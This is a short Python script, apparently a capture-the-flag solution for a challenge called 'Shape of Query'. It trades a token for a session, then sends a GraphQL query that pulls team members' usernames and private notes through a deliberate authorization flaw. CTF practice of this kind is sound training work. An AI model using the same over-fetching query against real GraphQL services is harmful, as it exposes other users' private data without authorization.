#!/usr/bin/env python3
"""Use the intended GraphQL introspection/authorization flaw in Shape of Query."""

import json
import sys
import requests


def main(token: str) -> None:
    portal = "https://shape-of-query.pointeroverflowctf.com"
    session = requests.Session()
    result = session.post(f"{portal}/session/exchange", json={"token": token})
    result.raise_for_status()
    query = "{me{team{members{username privateNotes}}}}"
    result = session.post(f"{portal}/graphql", json={"query": query})
    result.raise_for_status()
    data = result.json()["data"]["me"]["team"]["members"]
    print(json.dumps(data, indent=2))


if __name__ == "__main__":
    if len(sys.argv) != 2:
        raise SystemExit(f"usage: {sys.argv[0]} SHAPE1-token")
    main(sys.argv[1])
